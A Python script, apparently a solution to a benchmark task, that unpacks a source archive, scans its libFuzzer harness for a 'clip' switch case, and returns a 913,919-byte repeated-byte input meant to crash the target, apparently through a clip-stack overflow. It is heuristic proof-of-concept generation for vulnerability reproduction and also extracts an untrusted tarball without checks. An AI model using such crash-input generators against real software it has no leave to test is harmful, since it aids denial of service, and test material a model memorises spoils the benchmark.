import os
import tarfile
import tempfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        DEFAULT_LEN = 913919
        DEFAULT_BYTE = 0x41

        def default_poc() -> bytes:
            return bytes([DEFAULT_BYTE]) * DEFAULT_LEN

        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                # Extract tarball
                try:
                    with tarfile.open(src_path, "r:*") as tf:
                        tf.extractall(tmpdir)
                except Exception:
                    return default_poc()

                best_fuzzer_code = None
                best_score = -1

                # Find fuzzer file with LLVMFuzzerTestOneInput and highest occurrence of clip-related words
                for root, _, files in os.walk(tmpdir):
                    for name in files:
                        lname = name.lower()
                        if not (
                            lname.endswith(".c")
                            or lname.endswith(".cc")
                            or lname.endswith(".cpp")
                            or lname.endswith(".cxx")
                            or lname.endswith(".c++")
                            or lname.endswith(".h")
                            or lname.endswith(".hpp")
                        ):
                            continue
                        path = os.path.join(root, name)
                        try:
                            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                                code = f.read()
                        except Exception:
                            continue

                        if "LLVMFuzzerTestOneInput" not in code:
                            continue

                        idx = code.find("LLVMFuzzerTestOneInput")
                        snippet = code[idx: idx + 5000]
                        lower_snip = snippet.lower()
                        score = (
                            lower_snip.count("clip")
                            + lower_snip.count("layer")
                            + lower_snip.count("stack")
                        )
                        if score > best_score:
                            best_score = score
                            best_fuzzer_code = code

                if best_fuzzer_code is None:
                    return default_poc()

                # Focus on the fuzzer function body
                func_start = best_fuzzer_code.find("LLVMFuzzerTestOneInput")
                func_code = best_fuzzer_code[func_start:]

                best_clip_case_index = None
                best_clip_local_score = -1

                pos = 0
                fc_len = len(func_code)

                # Scan for switch statements inside LLVMFuzzerTestOneInput
                while True:
                    m = re.search(r"\bswitch\s*\(", func_code[pos:])
                    if not m:
                        break
                    switch_start = pos + m.start()
                    paren_start = func_code.find("(", switch_start)
                    if paren_start == -1:
                        break

                    # Find matching ')'
                    i = paren_start
                    depth = 0
                    while i < fc_len:
                        ch = func_code[i]
                        if ch == "(":
                            depth += 1
                        elif ch == ")":
                            depth -= 1
                            if depth == 0:
                                break
                        i += 1
                    if depth != 0:
                        pos = paren_start + 1
                        continue
                    paren_end = i

                    # Find opening '{' for the switch
                    j = paren_end + 1
                    while j < fc_len and func_code[j] in " \t\r\n":
                        j += 1
                    if j >= fc_len or func_code[j] != "{":
                        pos = paren_end + 1
                        continue
                    brace_start = j

                    # Find matching '}' for this switch block
                    k = brace_start
                    depth = 0
                    while k < fc_len:
                        c = func_code[k]
                        if c == "{":
                            depth += 1
                        elif c == "}":
                            depth -= 1
                            if depth == 0:
                                break
                        k += 1
                    if depth != 0:
                        pos = brace_start + 1
                        continue
                    brace_end = k

                    switch_block = func_code[brace_start: brace_end + 1]
                    if len(switch_block) < 2:
                        pos = brace_end + 1
                        continue

                    inner = switch_block[1:-1]  # remove outer braces
                    low_inner = inner.lower()
                    if "clip" not in low_inner:
                        pos = brace_end + 1
                        continue

                    # Parse case statements within this switch
                    case_matches = list(re.finditer(r"\bcase\s+(\d+)\s*:", inner))
                    if not case_matches:
                        pos = brace_end + 1
                        continue

                    for idx_case, mcase in enumerate(case_matches):
                        try:
                            case_val = int(mcase.group(1))
                        except ValueError:
                            continue
                        start_body = mcase.end()
                        end_body = (
                            case_matches[idx_case + 1].start()
                            if idx_case + 1 < len(case_matches)
                            else len(inner)
                        )
                        body = inner[start_body:end_body]
                        body_l = body.lower()
                        if "clip" in body_l:
                            local_score = body_l.count("clip")
                            if local_score > best_clip_local_score:
                                best_clip_local_score = local_score
                                best_clip_case_index = case_val

                    pos = brace_end + 1

                if best_clip_case_index is None:
                    return default_poc()

                # Choose byte that should map to the clip case in typical mod/direct mappings
                byte_val = best_clip_case_index & 0xFF
                if byte_val < 0 or byte_val > 255:
                    byte_val = best_clip_case_index % 256

                poc_len = DEFAULT_LEN
                return bytes([byte_val]) * poc_len

        except Exception:
            return default_poc()
